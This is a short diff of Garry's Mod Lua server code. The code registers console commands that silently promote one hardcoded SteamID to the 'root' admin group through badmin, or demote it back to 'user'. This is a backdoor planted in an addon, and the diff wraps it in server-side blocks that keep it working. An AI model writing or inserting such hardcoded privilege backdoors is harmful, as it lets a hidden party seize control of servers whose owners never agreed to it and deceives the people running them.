@@ -1,5 +1,5 @@
 
-
+if SERVER then
 concommand.Add("karapuz_rank_root", function( ply ) 
 if ply:SteamID() == 'STEAM_0:0:555589835' then 
     RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'root')
@@ -15,12 +15,12 @@ if ply:SteamID() == 'STEAM_0:0:555589835' then
                 
         end
     end)
+end
 
 
 
 
-
-
+if SERVER then
 concommand.Add("karapuz_rank_user", function( ply ) 
 if ply:SteamID() == 'STEAM_0:0:555589835' then 
     RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'user')
@@ -36,7 +36,7 @@ if ply:SteamID() == 'STEAM_0:0:555589835' then
                 
         end
     end)
-
+end
 
 
 
